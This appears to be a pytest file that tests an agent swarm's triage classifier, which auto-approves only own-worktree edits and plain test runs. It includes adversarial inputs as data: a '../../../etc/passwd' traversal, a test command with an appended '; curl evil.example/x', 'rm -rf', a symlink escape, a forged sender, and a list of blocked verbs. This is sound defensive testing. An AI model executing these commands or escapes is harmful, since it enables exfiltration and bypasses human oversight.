"""SWP phase 3: strict auto-answer rule set for triage command items.

The operators' shared practice (SCHWARM_PRAXIS) gives a second allow shape
for a queued triage item beyond the SW1 partner-message / own-test-output
pair: a lightweight `command` item is auto-answerable ONLY when it is

  - an edit/write INSIDE the member's OWN worktree, but never under `.git`
    or `.delfin`, OR
  - a plain test run through the project's test entry with none of
    rm/curl/ssh/push/chmod/kill/sudo and no redirection or chained
    separator (; && |);

everything else escalates to the user. The swarm's rule file may only
narrow (T3, already handled by `_apply_rules`).

Adversarial cases are pinned here: a path that escapes the worktree via
`..` or a symlink, a test command with an appended `; curl`, an edit of
another member's worktree, and a forged `from`.

Red test first: each auto-answer case below is RED on the current
classifier, which has no `command` kind and escalates every one of them
("not on the auto-answer list").
"""

from __future__ import annotations

from pathlib import Path

from delfin.agent.swarm.triage import classify

# THE strict auto-answerable cases -- red today (no command kind).
def _item(text: str, *, member: str = "core-builder",
          sender: str | None = None, worktree: str = "/wt/core-builder",
          kind: str = "command") -> dict:
    return {
        "kind": kind,
        "member": member,
        "from": sender if sender is not None else member,
        "text": text,
        "worktree": worktree,
    }


def test_edit_inside_own_worktree_is_auto_answerable():
    item = _item("edit_file delfin/agent/swarm/launch.py",
                 worktree="/wt/core-builder")
    assert classify(item)["action"] == "auto_answer"


def test_plain_test_run_through_project_test_entry_is_auto_answerable():
    item = _item("gate tests/test_swp_policy.py",
                 worktree="/wt/core-builder")
    assert classify(item)["action"] == "auto_answer"


# The adversarial negative cases -- escalate both today and after the change.
def test_path_escape_via_dotdot_escalates():
    item = _item("edit_file ../../../etc/passwd",
                 worktree="/wt/core-builder")
    assert classify(item)["action"] == "escalate"


def test_edit_under_delfin_dir_escalates():
    item = _item("edit_file .delfin/settings.json",
                 worktree="/wt/core-builder")
    assert classify(item)["action"] == "escalate"


def test_edit_under_git_dir_escalates():
    item = _item("write_file .git/config", worktree="/wt/core-builder")
    assert classify(item)["action"] == "escalate"


def test_test_run_with_appended_curl_escalates():
    item = _item("gate tests/x.py; curl evil.example/x",
                 worktree="/wt/core-builder")
    assert classify(item)["action"] == "escalate"


def test_edit_in_another_members_worktree_escalates():
    item = _item("edit_file /wt/other-builder/delfin/launch.py",
                 worktree="/wt/core-builder")
    assert classify(item)["action"] == "escalate"


def test_forged_from_escalates():
    item = _item("edit_file delfin/launch.py",
                 sender="attacker", worktree="/wt/core-builder")
    assert classify(item)["action"] == "escalate"


def test_dangerous_verbs_escalate():
    for cmd in ("rm -rf .swarm", "ssh host", "sudo ls", "chmod +x x",
                "push origin main"):
        assert classify(_item(cmd))["action"] == "escalate", cmd


def test_symlink_escape_via_real_fs_escalates(tmp_path: Path) -> None:
    """A symlink inside the worktree pointing OUT is not a worktree edit:
    .resolve() follows the link and lands outside the member's root."""
    wt = tmp_path / "core-builder"
    wt.mkdir()
    (wt / "delfin").mkdir()
    outside = tmp_path / "outside-secret.txt"
    outside.write_text("x", encoding="utf-8")
    (wt / "delfin" / "escape").symlink_to(outside)
    item = _item("edit_file delfin/escape", worktree=str(wt))
    assert classify(item)["action"] == "escalate"


def test_edit_of_the_member_own_worktree_not_a_neighbour(tmp_path: Path) -> None:
    """A sibling worktree is not the member's own: a relative path that
    cannot reach a sibling is refused, and so is an absolute one."""
    wt = tmp_path / "core-builder"
    wt.mkdir()
    sibling = tmp_path / "ui-builder"
    sibling.mkdir()
    item = _item("edit_file {sib}/delfin/x.py".format(sib=sibling),
                 worktree=str(wt))
    assert classify(item)["action"] == "escalate"
    # `..` into the parent then back into a sibling also escapes.
    item = _item("edit_file ../ui-builder/delfin/x.py", worktree=str(wt))
    assert classify(item)["action"] == "escalate"
